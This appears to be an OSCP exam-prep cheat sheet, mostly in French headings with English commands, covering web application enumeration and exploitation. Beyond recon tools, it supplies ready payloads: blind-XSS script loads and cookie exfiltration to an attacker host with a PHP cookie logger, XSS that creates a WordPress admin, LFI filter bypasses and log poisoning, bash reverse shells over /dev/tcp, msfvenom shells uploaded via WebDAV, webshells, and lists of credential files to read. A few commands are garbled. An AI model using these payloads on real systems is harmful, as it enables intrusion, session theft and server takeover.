---
title: "OSCP · Applications web"
description: "Examiner les fonctionnalités, entrées et configurations des applications web."
---

# OSCP · Applications web

Examiner les fonctionnalités, entrées et configurations des applications web.


### Identification des technologies


Commande `whatweb` pour la rubrique « Identification des technologies ».

```bash
# Detect technologies used by the target website
whatweb -a 3 [TARGET_IP]

# Scan for potential vulnerabilities and server misconfigurations
nikto -ask=no -h http://[TARGET_IP] 2>&1

whatweb -a 3 $IP
nikto -ask=no -h http://$IP 2>&1

# When find an HTTP website always try to do a post on the get requests you find to see what happens

# Obtain SSL certificate information
openssl s_client -connect <target_domain>:443
```


Récupérer une ressource distante ou une réponse HTTP.

```bash
# When discovering an HTTP website, test various HTTP methods to identify potential vulnerabilities. Use the following command to enumerate allowed methods:
curl -X OPTIONS http://[TARGET_IP] -i

# Then, try POST requests or other methods found to see how the server responds:
curl -X POST http://[TARGET_IP]/[endpoint] -d "test=data"
```


Commande `wappalyzer` pour la rubrique « Identification des technologies ».

```bash
# Use Wappalyzer to identify technologies and frameworks
wappalyzer --url http://[TARGET_IP]

# Use BuiltWith to gather detailed technology profile
builtwith [TARGET_IP]

# Scan for additional information using HTTP headers
curl -I http://[TARGET_IP]
```


#### FFUF


Rechercher des chemins ou paramètres web.

```bash
# Basic directory fuzzing
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ

# Filter to show only 200 or 3xx responses
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -mc 200,300-399

# Output results to a file
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -o results.txt

# Recursive directory fuzzing
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -recursion

# Set number of threads
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -t 50

# Use proxy
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -x http://127.0.0.1:8080

# Use a delay between requests
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -p 0.1-0.5

# Set request timeout
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -timeout 10

# Match response size
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -fs 4242

# Example usage
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://$IP/FUZZ
ffuf -w /usr/share/wordlists/dirb/big.txt -u http://$IP/FUZZ
```


#### DIRB


Rechercher des chemins ou paramètres web.

```bash
# Basic directory scanning
dirb http://target /path/to/wordlist.txt

# Save output to a file
dirb http://target /path/to/wordlist.txt -o results.txt

# Use custom user-agent
dirb http://target /path/to/wordlist.txt -a "Mozilla/5.0"

# Ignore non-existent pages
dirb http://target /path/to/wordlist.txt -N

# Scan SSL (HTTPS)
dirb https://target /path/to/wordlist.txt

# Recursively scan directories
dirb http://target /path/to/wordlist.txt -r

# Exclude specific status codes
dirb http://target /path/to/wordlist.txt -n -X .php,.html,.txt

# Example usage
dirb http://target.com
```


#### GOBUSTER


Rechercher des chemins ou paramètres web.

```bash
# Basic directory scanning
gobuster dir -u http://target -w /path/to/wordlist.txt

# Filter to show only 200 responses
gobuster dir -u http://target -w /path/to/wordlist.txt -s 200

# Specify extensions
gobuster dir -u http://target -w /path/to/wordlist.txt -x php,html,txt

# Save output to a file
gobuster dir -u http://target -w /path/to/wordlist.txt -o results.txt

# Set number of threads
gobuster dir -u http://target -w /path/to/wordlist.txt -t 50

# Use proxy
gobuster dir -u http://target -w /path/to/wordlist.txt -p http://127.0.0.1:8080

# Example usage
gobuster dir -u http://10.11.1.71:80/site/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e txt,php,html,htm
gobuster dir -u http://192.168.196.199 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x pdf
```


#### FEROXBUSTER


Rechercher des chemins ou paramètres web.

```bash
# Basic directory fuzzing
feroxbuster -u http://target -w /path/to/wordlist.txt -x php,html,txt

# Set number of threads, verbose mode, ignore certificate errors
feroxbuster -u http://$IP -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 

# Filter specific status codes
feroxbuster -u http://$IP -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -C 404 #ignore denied
feroxbuster -u http://$IP -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -C 404,302 #handle redirects
```


#### DIRSEARCH


Rechercher des chemins ou paramètres web.

```bash
# Basic directory scanning
dirsearch -u http://target -w /path/to/wordlist.txt

# Filter to show only 200 or 3xx responses
dirsearch -u http://target -w /path/to/wordlist.txt -i 200,300-399

# Specify extensions
dirsearch -u http://target -w /path/to/wordlist.txt -e php,html,txt

# Save output to a file
dirsearch -u http://target -w /path/to/wordlist.txt -r -o results.txt

# Set number of threads
dirsearch -u http://target -w /path/to/wordlist.txt -t 50

# Use proxy
dirsearch -u http://target -w /path/to/wordlist.txt -x http://127.0.0.1:8080

# Ignore SSL certificate warnings
dirsearch -u https://target -w /path/to/wordlist.txt -k

# Exclude specific status codes
dirsearch -u http://target -w /path/to/wordlist.txt --exclude-status 404,403

# Example usage
dirsearch -u http://$IP/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt 
dirsearch -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 300 --recursive --exclude-status=400,404,405,408
```


#### WFUZZ


Rechercher des chemins ou paramètres web.

```bash
# Find available directories
wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<target_ip>/FUZZ

# Find available directories with cookies
wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -H "cookie: <cookie_name>=<cookie_value>" http://<target_ip>/FUZZ

# Fuzz data parameters
wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -d "id=FUZZ&catalogue=1" http://<target_ip>

# Subdomain enumeration
wfuzz --hc 404 -c -w /usr/share/amass/wordlists/subdomains-top1mil-110000.txt -H "HOST: FUZZ.<target_domain>" <target_domain>

# Enumerate hidden directories
wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<target_ip>/.FUZZ

# Skip SSL Certificate validation
wfuzz --hc 404 -c -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<target_ip>/FUZZ

# Use threads to speed up process (not advisable to exceed 200)
wfuzz --hc 404 -c -t <number_of_threads> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<target_ip>/FUZZ
```


#### FFUF


Rechercher des chemins ou paramètres web.

```bash
# Basic file fuzzing
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ

# Filter to show only 200 or 3xx responses
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -mc 200,300-399

# Specify extensions
ffuf -w /path/to/wordlist.txt:FUZZ -u http://target/FUZZ.html,http://target/FUZZ.php -mc 200,300-399

# Output results to a file
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -o results.txt

# Set number of threads
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -t 50

# Use proxy
ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -x http://127.0.0.1:8080
```


#### DIRB


Rechercher des chemins ou paramètres web.

```bash
# Basic file scanning with default extensions
dirb http://target /path/to/wordlist.txt -X .php,.html,.txt

# Save output to a file
dirb http://target /path/to/wordlist.txt -X .php,.html,.txt -o results.txt

# Use custom user-agent
dirb http://target /path/to/wordlist.txt -X .php,.html,.txt -a "Mozilla/5.0"

# Ignore non-existent pages
dirb http://target /path/to/wordlist.txt -X .php,.html,.txt -N

# Scan SSL (HTTPS)
dirb https://target /path/to/wordlist.txt -X .php,.html,.txt
```


#### GOBUSTER


Rechercher des chemins ou paramètres web.

```bash
# Basic file scanning
gobuster dir -u http://target -w /path/to/wordlist.txt

# Filter to show only 200 responses
gobuster dir -u http://target -w /path/to/wordlist.txt -s 200

# Specify extensions
gobuster dir -u http://target -w /path/to/wordlist.txt -x php,html,txt

# Save output to a file
gobuster dir -u http://target -w /path/to/wordlist.txt -o results.txt

# Set number of threads
gobuster dir -u http://target -w /path/to/wordlist.txt -t 50

# Use proxy
gobuster dir -u http://target -w /path/to/wordlist.txt -p http://127.0.0.1:8080
```


#### FEROXBUSTER


Rechercher des chemins ou paramètres web.

```bash
# Basic file scanning
feroxbuster -u http://target -w /path/to/wordlist.txt

# Filter to show only 200 responses
feroxbuster -u http://target -w /path/to/wordlist.txt -s 200

# Specify extensions
feroxbuster -u http://target -w /path/to/wordlist.txt -x php,html,txt

# Save output to a file
feroxbuster -u http://target -w /path/to/wordlist.txt -o results.txt

# Set number of threads
feroxbuster -u http://target -w /path/to/wordlist.txt -t 50

# Use proxy
feroxbuster -u http://target -w /path/to/wordlist.txt -p http://127.0.0.1:8080

# Exclude specific status codes
feroxbuster -u http://target -w /path/to/wordlist.txt -e php,html,txt -C 404,403

# Use custom user-agent
feroxbuster -u http://target -w /path/to/wordlist.txt -a "Mozilla/5.0"
```


#### DIRSEARCH


Rechercher des chemins ou paramètres web.

```bash
# Basic file scanning
dirsearch -u http://target -w /path/to/wordlist.txt

# Filter to show only 200 or 3xx responses
dirsearch -u http://target -w /path/to/wordlist.txt -i 200,300-399

# Specify extensions
dirsearch -u http://target -w /path/to/wordlist.txt -e php,html,txt

# Save output to a file
dirsearch -u http://target -w /path/to/wordlist.txt -r -o results.txt

# Set number of threads
dirsearch -u http://target -w /path/to/wordlist.txt -t 50

# Use proxy
dirsearch -u http://target -w /path/to/wordlist.txt -x http://127.0.0.1:8080
```


### Dépôt Git exposé


**Paramètres et repères :**
`.git` (métadonnées Git)  


Commande `git-dumper` pour la rubrique « Dépôt Git exposé ».

```bash
# Dump the contents of an exposed .git directory
git-dumper http://[IP/Domain]/.git website_git

# Search for common secrets in the dumped files
grep -r 'password' .
grep -r 'apikey' .

# View a specific file that may contain credentials or sensitive data
cat website_git/config/database.php

# Check the commit log
git log

# Then to check the commit diff
git show [commitID]
```


**Paramètres et repères :**
`gitdumper.sh` · `extractor.sh`  


Commande `./gitdumper.sh` pour la rubrique « Dépôt Git exposé ».

```bash
./gitdumper.sh http://[domain].com/.git/ /path/to/save/git

# Check lasts commits
cd /path/to/git && git status

# Read selecter commit number
git commit [commitNumber]

# Restore last commit
git reset --hard

# Automatic script to read and restore last git dump
./extractor.sh /.git/ extracted
```


### CMS

Examiner les entrées et les réponses de l'application web.


Commande `wpscan` pour la rubrique « CMS ».

```bash
# Basic WordPress scan
wpscan --url http://$IP/wp/
```


Commande `wpscan` pour la rubrique « CMS ».

```bash
# Brute forcing WordPress login
wpscan --url http://$IP/wp/wp-login.php -U Admin --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login
```


Commande `wpscan` pour la rubrique « CMS ».

```bash
wpscan -u "http://<IP>/" --wp-content-dir "<custom-path>"
```


Commande `wpscan` pour la rubrique « CMS ».

```bash
wpscan -u "http://<IP>/" --enumerate u

# Using wordlist
wpscan -u "http://<IP>/" --username <username> -w /usr/share/SecList/Usernames/xato-usernames-top-1millions-20000.txt
```


Commande `https` pour la rubrique « CMS ».

```bash
# Using a malicious WordPress plugin
https://github.com/wetw0rk/malicious-wordpress-plugin

# Usage
python3 wordpwn.py [LHOST] [LPORT] [HANDLER]

# Example
python3 wordpwn.py 192.168.119.140 443 Y
```


Commande `droopescan` pour la rubrique « CMS ».

```bash
# Scan Drupal CMS
droopescan scan drupal -u [TARGET_URL]
```


Récupérer une ressource distante ou une réponse HTTP.

```bash
# Download the .git directory if exposed
sudo wget -r http://[TARGET_IP]/.git/

# Move into the .git directory locally
cd [TARGET_IP]

# Show Git commits and reveal sensitive information
sudo git show
```


Exemple technique pour la rubrique « CMS ».

```text
# Location and version info

[+] Simple File List
| Location: http://[TARGET_IP]/wp-content/plugins/simple-file-list/
| Last Updated: [LAST_UPDATE]
| [!] The version is out of date; the latest version is [LATEST_VERSION]

# Exploit for Simple File List < [VULNERABLE_VERSION] - Unauthenticated Arbitrary File Upload

https://www.exploit-db.com/exploits/48979
```


Commande `cewl` pour la rubrique « CMS ».

```bash
cewl -w <dictionary-file> "http://<IP>/" --with-numbers
```


Commande `wpscan` pour la rubrique « CMS ».

```bash
# Detect vulnerable plugins
wpscan --url http(s)://<IP>/ --enumerate vp

# Detect all plugins
wpscan --url http(s)://<IP>/ --enumerate p

# Aggressive detection of all plugins
wpscan --url http(s)://<IP>/ --enumerate p --plugins-detection aggressive
```


### WebDav

Examiner les entrées et les réponses de l'application web.


Commande `80/tcp` pour la rubrique « WebDav ».

```bash
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-webdav-scan:
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
```


Commande `cadaver` pour la rubrique « WebDav ».

```bash
# Use cadaver
cadaver [IP]
```


Commande `msfvenom` pour la rubrique « WebDav ».

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=80 -f aspx -o shell.aspx
```


Récupérer une ressource distante ou une réponse HTTP.

```bash
curl -T 'shell.aspx' 'http://$VictimIP/' -u <username>:<password>
```


Tester ou établir une connexion réseau avec Netcat.

```bash
nc -nvlp 80
```


Commande `http` pour la rubrique « WebDav ».

```text
http://$VictimIP/shell.aspx
```


### APIs


Récupérer une ressource distante ou une réponse HTTP.

```bash
# Basic API exploration
curl http://$IP/api/

# Example output
[{"string":"/api/","id":13},{"string":"/article/","id":14},{"string":"/article/?","id":15},{"string":"/user/","id":16},{"string":"/user/?","id":17}] 

# Common API Pattern
/api_name/v1

# Explore specific endpoints
curl http://$IP/api/user/ 

http://[IP]:[PORT]/search
{"query":"*","result":""}

curl -X GET "http://[IP]:[PORT]/search?query=*"
{"query":"*","result":""}

curl -X GET "http://[IP]:[PORT]/search?query=lol"
{"query":"lol","result":""}

# Use -d for data and -H for headers
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://[IP]:[PORT]/users/v1/login

# Option to send request to proxy as well
--proxy 127.0.0.1:8080
```


### Listes de mots


Exemple technique pour la rubrique « Listes de mots ».

```text
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```


Exemple technique pour la rubrique « Listes de mots ».

```text
/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```


Exemple technique pour la rubrique « Listes de mots ».

```text
/usr/share/seclists/Discovery/Web-Content/common.txt
```


**Paramètres et repères :**
`/usr/share/seclists/Discovery/Web-Content/big.txt`  


Récupérer une ressource distante ou une réponse HTTP.

```bash
# Get the website content
curl http://example.com > example.txt

# Remove duplicated entries

# Crate the dictionary
html2dic example.txt
# Autre possibilité
cewl -w createWordlist.txt https://www.example.com

# Improve the wordlist with rules
john ---wordlist=wordlist.txt --rules --stdout > wordlist-modified.txt
```


## XSS

Examiner les entrées et les réponses de l'application web.


### Theory


Exemple technique pour la rubrique « Theory ».

```text
< > ' " { } ;
```


**Stored (Persistent)**


**Reflected (Non-Persistent)**


**DOM-Based**


### Stored


Exemple technique pour la rubrique « Stored ».

```html
# Text to save to the application.
<script>alert("XSS")</script>

<script>alert(document.cookie)</script>

<script>alert(window.origin)</script>
```


### Reflected


Commande `http` pour la rubrique « Reflected ».

```bash
http://[SERVER_IP]:[PORT]/index.php?task=%3Cscript%3Ealert(document.cookie)%3C/script%3E
```

![Reflected XSS Payload](https://www.emmanuelsolis.com/img/xss01.png)

![Reflected XSS Result](https://www.emmanuelsolis.com/img/xss02.png)


### Blind


Exemple technique pour la rubrique « Blind ».

```html
<script src=http://[OUR_IP]></script>

'><script src=http://[OUR_IP]></script>

<script>$.getScript("http://[OUR_IP]")</script>

"><script src=http://[OUR_IP]></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
```


### PrivEsc Using Session Hijacking


Commande `document.location` pour la rubrique « PrivEsc Using Session Hijacking ».

```html
# Possible Payloads
document.location='http://OUR_IP/index.php?c='+document.cookie;
# Autre possibilité
new Image().src='http://OUR_IP/index.php?c='+document.cookie;

# Access the Host
<script src=http://OUR_IP>/script.js</script>
```


Exemple technique pour la rubrique « PrivEsc Using Session Hijacking ».

```php
# Payload
<img src=x onerror=fetch('http://10.10.14.37/'+document.cookie);>

# PHP Server Code
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```


### Wordpress HttpOnly Cookie (Visitor Plugin)

Examiner les entrées et les réponses de l'application web.


Commande `var` pour la rubrique « Wordpress HttpOnly Cookie (Visitor Plugin) ».

```php
var request = new XMLHttpRequest();
var targetURL = "/wp-admin/user-new.php";
var regex = /name="([^"]*?)"/g;
request.open("GET", targetURL, false);
request.send();
var match = regex.exec(request.responseText);
var nonce = match[1];
```


Commande `var` pour la rubrique « Wordpress HttpOnly Cookie (Visitor Plugin) ».

```php
var params = "action=createuser&_wpnonce_create-user=" + nonce + "&user_login=newadmin&email=newadmin@example.com&pass1=newpassword&pass2=newpassword&role=administrator";
var request = new XMLHttpRequest();
request.open("POST", targetURL, true);
request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
request.send(params);
```


Commande `var` pour la rubrique « Wordpress HttpOnly Cookie (Visitor Plugin) ».

```php
var params = "action=createuser&_wpnonce_create-user=" + nonce + "&user_login=newadmin&email=newadmin@example.com&pass1=newpassword&pass2=newpassword&role=administrator";
var request = new XMLHttpRequest();
request.open("POST", targetURL, true);
request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
request.send(params);
```


Commande `function` pour la rubrique « Wordpress HttpOnly Cookie (Visitor Plugin) ».

```javascript
function toJavaScriptEncoding(str) {
    var result = '';
    for (var i = 0; i < str.length; i++) {
        result += str.charCodeAt(i);
        if (i !== str.length - 1) {
            result += ",";
        }
    }
    return result;
}

let encodedPayload = toJavaScriptEncoding('insert_minified_javascript');
console.log(encodedPayload);
```


**Paramètres et repères :**
`eval`  


Récupérer une ressource distante ou une réponse HTTP.

```bash
curl -i http://example.com --user-agent "<script>eval(String.fromCharCode(<resultFromRunningAboveScritpToEncode>))</script>" --proxy 127.0.0.1:8080
```


### Automated Découverte


Commande `git` pour la rubrique « Automated Découverte ».

```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt

python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```


**Paramètres et repères :**
`user-agent`  


Rechercher des chemins ou paramètres web.

```bash
# [xss.req] is the request captured from BurpSuite.
ffuf -ic -c -of csv -request-proto http -request [xss.req] -w XSS-RSNAKE.txt
```


## File Inclusion

Examiner les entrées et les réponses de l'application web.


### Inclusion de fichiers locaux (LFI)

Examiner les entrées et les réponses de l'application web.


#### Détection de LFI


Commande `http` pour la rubrique « Détection de LFI ».

```text
http://<target_url>/file.php?recurse=<file_name>
```


Rechercher des chemins ou paramètres web.

```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```


**Paramètres et repères :**
`GET`  


Rechercher des chemins ou paramètres web.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```


Rechercher des chemins ou paramètres web.

```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```


**Paramètres et repères :**
`../../../../`  


Rechercher des chemins ou paramètres web.

```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```


Rechercher des chemins ou paramètres web.

```bash
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```


#### Bypassing LFI Protections


Commande `http` pour la rubrique « Bypassing LFI Protections ».

```bash
# URL encoding bypass
http://<target_url>/file.php?recurse=../../../../../etc/passwd% 

# Null byte injection bypass
http://<target_url>/file.php?recurse=../../../../../etc/passwd?nullbyte

# Avoiding ..
http://<target_url>/file.php?recurse=.?/.?/.?/.?/.?/etc/passwd
http://<target_url>/file.php?recurse=.*/.*/.*/.*/.*/etc/passwd
http://<target_url>/file.php?recurse=.?/.?/.?/.?/.?/etc/passwd

# Double URL encoding
http://<target_url>/file.php?recurse=%252e%252e%252fetc%252fpasswd

# Repeated slashes bypass
http://<target_url>/file.php?recurse=....//....//....//etc/passwd

# Viewing a file with null byte injection
http://<target_url>/file.php?recurse=../../../../../etc/passwd%00

# Bypass file extension restrictions
http://<target_url>/file.php?recurse=../../../../../etc/passwd%2500.jpg

# Retrieve system environment variables
http://<target_url>/file.php?recurse=../../../../../proc/self/environ
```


#### LFI Wrappers


Commande `http` pour la rubrique « LFI Wrappers ».

```bash
http://<target_url>/file.php?recurse=php://filter/convert.base64-encode/resource=<file_name>

# Decode base64-encoded output
echo "<BASE64_ENCODED_OUTPUT>" | base64 -d
```


Commande `http` pour la rubrique « LFI Wrappers ».

```bash
http://<target_url>/file.php?recurse=php://filter/read=string.rot13/resource=<file_name>
```


Récupérer une ressource distante ou une réponse HTTP.

```bash
curl "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource=<FILE>"
```


##### Log Poisoning (Apache or SSH Logs)


**Paramètres et repères :**
`/var/log/apache2/access.log` · `/var/log/auth.log`  


Commande `http` pour la rubrique « Log Poisoning (Apache or SSH Logs) ».

```bash
http://<target_url>/file.php?recurse=../../../../../var/log/apache2/access.log
```


Exécuter une commande distante via SSH.

```bash
ssh "<?php system('whoami'); ?>"@<target>
```


Commande `http` pour la rubrique « Log Poisoning (Apache or SSH Logs) ».

```bash
http://<target_url>/file.php?recurse=../../../../../var/log/auth.log
```


##### Mail PHP Execution (RCE via Email)

Examiner les entrées et les réponses de l'application web.


**Paramètres et repères :**
`/etc/passwd`  


Commande `telnet` pour la rubrique « Mail PHP Execution (RCE via Email) ».

```bash
telnet <target_ip> 25
```


Commande `helo` pour la rubrique « Mail PHP Execution (RCE via Email) ».

```bash
HELO localhost
MAIL FROM:<root>
RCPT TO:<www-data>
DATA
<?php echo shell_exec($_REQUEST['cmd']); ?>
.
```


Commande `smtp-user-enum` pour la rubrique « Mail PHP Execution (RCE via Email) ».

```bash
smtp-user-enum -M VRFY -U <username_list> -t <target_ip>
```


#### Reverse Shell via LFI


**Paramètres et repères :**
`/proc/self/environ`  


Récupérer une ressource distante ou une réponse HTTP.

```bash
curl -X POST -d "cmd=<?php system('bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'); ?>" http://<target_url>/file.php?recurse=../../../../../proc/self/environ
```


Commande `http` pour la rubrique « Reverse Shell via LFI ».

```bash
http://<target_url>/file.php?recurse=../../../../../proc/self/environ
```


#### Outils utiles


Commande `git` pour la rubrique « Outils utiles ».

```bash
git clone https://github.com/D35m0nd142/LFISuite
```


Commande `python` pour la rubrique « Outils utiles ».

```bash
python rfiscanner.py <target_url>
```


### Inclusion de fichiers distants (RFI)

Examiner les entrées et les réponses de l'application web.


#### De base RFI Example


Commande `http` pour la rubrique « De base RFI Example ».

```bash
# This assumes the server's allow_url_fopen or allow_url_include settings are enabled.
http://<target_url>/file.php?recurse=http://<attacker_ip>/malicious.php
```


#### Reverse Shell via RFI


Commande `python3` pour la rubrique « Reverse Shell via RFI ».

```bash
python3 -m http.server 80
```


**Paramètres et repères :**
`revshell.php`  


Exemple technique pour la rubrique « Reverse Shell via RFI ».

```bash
# Option 1: Reverse Shell via PHP
<?php system($_GET['cmd']); ?>

# Option 2: Reverse Shell via Bash
bash -c "sh -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1"
```


Récupérer une ressource distante ou une réponse HTTP.

```bash
curl "http://<TARGET>/index.php?page=http://<ATTACKER_IP>/revshell.php&cmd=ls"
```


### WordPress Plugin for Reverse Shell


Commande `http` pour la rubrique « WordPress Plugin for Reverse Shell ».

```text
http://[IP]/[cms-path]/wp-content/nonexistent?cmd=[command]
```


**Paramètres et repères :**
`multi-os-php-reverse-shell.php`  


#### PHP Webshell

Examiner les entrées et les réponses de l'application web.


Exemple technique pour la rubrique « PHP Webshell ».

```php
<?php system($_GET['cmd']); ?>
```


#### ASP Webshell

Examiner les entrées et les réponses de l'application web.


Exemple technique pour la rubrique « ASP Webshell ».

```text
<% eval request('cmd') %>
```


#### Non-Meterpreter Payload for Netcat

Vérifier les ports et les services de la cible autorisée.


Commande `msfvenom` pour la rubrique « Non-Meterpreter Payload for Netcat ».

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT>
```


#### Fichiers Linux courants

Examiner les permissions et la configuration de Linux.


Commande `/etc/passwd` pour la rubrique « Fichiers Linux courants ».

```bash
# Popular Files
/etc/passwd                       # Contains user accounts
/etc/shadow                       # Stores hashed user passwords
/var/www/html/wp-config.php       # WordPress configuration
/proc/self/environ                # Environment variables (can contain session tokens)

# Additional Options
/etc/passwd
/etc/shadow
/etc/hosts
/home/<user>/.ssh/id_rsa
/home/<user>/.bash_history
/etc/apache2/sites-available/000-default.conf
/etc/httpd/logs/acces_log 
/etc/httpd/logs/error_log 
/var/www/logs/access_log 
/var/www/logs/access.log 
/usr/local/apache/logs/access_ log 
/usr/local/apache/logs/access. log 
/var/log/apache/access_log 
/var/log/apache2/access_log 
/var/log/apache/access.log 
/var/log/apache2/access.log
/var/log/access_log
/proc/self/environ
../wp-content/wp-config.php
/www/apache/conf/httpd.conf
```


#### Fichiers Windows courants

Observer les permissions et la configuration de Windows.


Commande `c` pour la rubrique « Fichiers Windows courants ».

```bash
# Popular Files
C:\Windows\System32\drivers\etc\hosts          # Hosts file
C:\xampp\apache\logs\access.log                # Apache access logs
C:\xampp\php\php.ini                           # PHP configuration file
C:\Users\Administrator\NTUser.dat              # Windows user data
C:\Windows\System32\config\SAM                 # Security Account Manager database (passwords)
C:\Windows\System32\winevt\Logs\Security.evtx  # Security event logs

# Additional Options
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
